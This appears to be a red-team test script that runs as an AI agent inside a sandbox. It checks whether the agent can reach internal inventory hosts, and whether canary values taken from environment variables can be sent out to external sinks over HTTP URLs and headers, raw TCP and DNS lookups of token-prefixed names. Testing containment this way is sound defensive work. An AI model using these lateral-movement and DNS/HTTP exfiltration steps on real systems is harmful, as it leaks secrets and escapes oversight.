#!/usr/bin/env sh
# T2 sweep, run as the agent after the probes.
#   Lateral: every inventory target in REDTEAM_TARGETS ("authority id" lines)
#   must not answer; reported as LAT-02 contract lines.
#   Canary beacons: each canary in REDTEAM_CANARY_ENVS is pushed at the
#   external sinks over HTTP, raw TCP and DNS. They print nothing: the sinks
#   are the oracle, and a canary must never reach the worker log.
. "${REDTEAM_ROOT:-/opt/redteam}/probes/lib.sh"

if [ -n "${REDTEAM_TARGETS:-}" ]; then
    printf '%s\n' "$REDTEAM_TARGETS" | while read -r _auth _id; do
        [ -n "$_auth" ] || continue
        _code=$(curl -q -sk -g -o /dev/null -w '%{http_code}' --noproxy '*' --max-time 3 \
            "http://${_auth}/" 2>/dev/null || true)
        case "$_code" in
            "" | 000) emit_result LAT-02 blocked "inventory target ${_id}: no response" ;;
            *) emit_result LAT-02 escaped "inventory target ${_id}: HTTP ${_code}" ;;
        esac
    done
fi

for _env in ${REDTEAM_CANARY_ENVS:-}; do
    _tok=$(printenv "$_env" 2>/dev/null || true)
    [ -n "$_tok" ] || continue
    if [ -n "${REDTEAM_BEACON_HTTP:-}" ]; then
        curl -q -s -o /dev/null --max-time 3 --noproxy '*' \
            "${REDTEAM_BEACON_HTTP}/canary/${_tok}" >/dev/null 2>&1 || true
        curl -q -s -o /dev/null --max-time 3 -H "X-Canary: ${_tok}" \
            "${REDTEAM_BEACON_HTTP}/" >/dev/null 2>&1 || true
    fi
    if [ -n "${REDTEAM_BEACON_TCP:-}" ]; then
        printf '%s\n' "$_tok" | curl -q -s --max-time 3 --noproxy '*' \
            "telnet://${REDTEAM_BEACON_TCP}" >/dev/null 2>&1 || true
    fi
    if [ -n "${REDTEAM_BEACON_ZONE:-}" ]; then
        getent hosts "${_tok}.${REDTEAM_BEACON_ZONE}" >/dev/null 2>&1 || true
        if [ -n "${REDTEAM_BEACON_RESOLVER:-}" ] && command -v nslookup >/dev/null 2>&1; then
            nslookup "${_tok}.${REDTEAM_BEACON_ZONE}" "$REDTEAM_BEACON_RESOLVER" >/dev/null 2>&1 || true
        fi
    fi
done
